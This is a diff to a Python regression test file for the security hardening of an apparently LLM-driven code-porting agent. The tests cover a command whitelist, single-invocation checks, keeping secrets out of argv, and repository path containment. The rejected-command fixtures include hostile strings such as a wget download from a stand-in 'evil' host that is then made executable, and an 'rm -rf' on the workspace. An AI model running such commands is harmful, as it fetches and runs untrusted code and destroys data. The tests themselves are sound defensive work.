@@ -1,4 +1,4 @@
-"""Regression tests for the REPORT.md security/lifetime hardening.
+"""Regression tests for the security and lifetime hardening.
 
 Covers, by finding ID:
 
@@ -6,7 +6,7 @@ Covers, by finding ID:
     tail cannot ride along on an approved first token, while the
     internally-constructed chains the agent depends on still validate.
   * SEC-02 — LLM-authored fix commands must be a single invocation.
-  * SEC-08 — the fixer's "read-only" investigation refuses chains.
+  * SEC-05 — secret env values stay out of the process argument list.
   * SEC-03 — file writes are contained to the repository tree.
   * MEM-01 — the caller-side wall timeout stays above the provider's
     HTTP timeout so the socket is released first.
@@ -19,12 +19,11 @@ No test here runs Docker, the network, or an LLM.
 from __future__ import annotations
 
 import os
+from pathlib import Path
 
 from src.tools import CommandValidator
 
-# ===========================================================================
 # SEC-01 — per-segment whitelist enforcement
-# ===========================================================================
 
 
 class TestSegmentValidation:
@@ -44,8 +43,9 @@ class TestSegmentValidation:
         "ls -la || /tmp/payload",
     ]
 
-    # Real commands the agent constructs internally. These MUST keep
-    # validating or the porting pipeline breaks.
+    # Commands the agent constructs internally (clone reset, build plans,
+    # file writes) and other chain shapes the whitelist must accept.
+    # These MUST keep validating or the porting pipeline breaks.
     INTERNAL_CHAINS = [
         (
             "cd /workspace/repos/x && git fetch --depth 1 origin && "
@@ -70,13 +70,11 @@ class TestSegmentValidation:
     ]
 
     def test_chained_unknown_tail_is_blocked(self) -> None:
-        """A non-whitelisted segment rejects the whole command."""
         for command in self.CHAINED_BYPASSES:
             ok, _reason = self.validator.is_safe(command)
             assert ok is False, f"SEC-01 bypass allowed: {command!r}"
 
     def test_internal_chains_still_validate(self) -> None:
-        """Segment validation must not break the agent's own commands."""
         for command in self.INTERNAL_CHAINS:
             ok, reason = self.validator.is_safe(command)
             assert ok is True, f"regression, blocked {command!r}: {reason}"
@@ -89,15 +87,12 @@ class TestSegmentValidation:
         assert segments == ["grep -rn 'a;b|c' .", "echo done"]
 
     def test_single_segment_reason_is_stable(self) -> None:
-        """The historical rejection wording is preserved."""
         ok, reason = self.validator.is_safe("nmap 1.2.3.4")
         assert ok is False
         assert reason == "Unknown command pattern (not in whitelist)"
 
 
-# ===========================================================================
 # SEC-02 — LLM fix commands must be single invocations
-# ===========================================================================
 
 
 class TestSingleInvocationMode:
@@ -106,7 +101,6 @@ class TestSingleInvocationMode:
     validator = CommandValidator()
 
     def test_single_command_allowed(self) -> None:
-        """A plain build command passes."""
         ok, _ = self.validator.is_safe_single("make -j4")
         assert ok is True
 
@@ -116,7 +110,6 @@ class TestSingleInvocationMode:
         assert ok is True
 
     def test_chain_of_whitelisted_commands_blocked(self) -> None:
-        """Individually-safe commands may not be chained together."""
         for command in (
             "wget http://evil/x -O /tmp/x && chmod +x /tmp/x",
             "make && rm -rf /workspace/repos",
@@ -133,7 +126,6 @@ class TestSingleInvocationMode:
         assert ok is False
 
     def test_quoted_redirect_char_is_not_redirection(self) -> None:
-        """A `>` inside a quoted literal must not trip the check."""
         ok, _ = self.validator.is_safe_single("grep -rn 'a > b' .")
         assert ok is True
 
@@ -147,15 +139,14 @@ class TestSingleInvocationMode:
         assert ok is True
 
 
-# ===========================================================================
 # SEC-05 — secrets must not appear in the process argument list
-# ===========================================================================
 
 
 class TestSecretsStayOutOfArgv:
     """Credential values are passed by env name, never inline in argv."""
 
     def _run(self, extra_env):
+        """Run ``git status`` with ``extra_env``; return argv and env."""
         from types import SimpleNamespace
         from unittest import mock
 
@@ -194,7 +185,6 @@ class TestSecretsStayOutOfArgv:
         assert "GIT_TERMINAL_PROMPT=0" in captured["args"]
 
     def test_secret_key_detection(self) -> None:
-        """Common credential key shapes are recognised."""
         from src.tools import _is_secret_env_key
 
         for key in (
@@ -209,16 +199,13 @@ class TestSecretsStayOutOfArgv:
             assert not _is_secret_env_key(key), key
 
 
-# ===========================================================================
 # SEC-03 — writes contained to the repository tree
-# ===========================================================================
 
 
 class TestRepoContainment:
     """`_is_within_repo` rejects traversal out of the repo."""
 
-    def test_paths_inside_repo_allowed(self, tmp_path) -> None:
-        """Normal in-repo paths are accepted."""
+    def test_paths_inside_repo_allowed(self, tmp_path: Path) -> None:
         from src.graph import _is_within_repo
 
         repo = tmp_path / "repo"
@@ -226,8 +213,9 @@ class TestRepoContainment:
         assert _is_within_repo(str(repo / "src" / "main.c"), str(repo))
         assert _is_within_repo(str(repo), str(repo))
 
-    def test_traversal_and_absolute_paths_blocked(self, tmp_path) -> None:
-        """`..` and absolute escapes are refused."""
+    def test_traversal_and_absolute_paths_blocked(
+        self, tmp_path: Path
+    ) -> None:
         from src.graph import _is_within_repo
 
         repo = tmp_path / "repo"
@@ -240,9 +228,7 @@ class TestRepoContainment:
             assert not _is_within_repo(escape, str(repo)), escape
 
 
-# ===========================================================================
 # MEM-01 / MEM-03 — lifetime invariants
-# ===========================================================================
 
 
 class TestLifetimeInvariants:
@@ -258,7 +244,6 @@ class TestLifetimeInvariants:
         assert HELPER_TIMEOUT > LLM_REQUEST_TIMEOUT
 
     def test_audit_trail_is_bounded(self) -> None:
-        """log_event caps the trail instead of growing forever."""
         from src.state import MAX_AUDIT_EVENTS, create_initial_state
 
         state = create_initial_state("https://github.com/foo/bar")
@@ -289,16 +274,13 @@ class TestLifetimeInvariants:
         )
 
 
-# ===========================================================================
 # CLI-02 — cheap up-front URL validation
-# ===========================================================================
 
 
 class TestRepoUrlValidation:
     """`is_valid_repo_url` gates the CLI before any expensive work."""
 
     def test_valid_urls_accepted(self) -> None:
-        """Plain http(s) URLs pass."""
         from src.state import is_valid_repo_url
 
         assert is_valid_repo_url("https://github.com/madler/zlib")
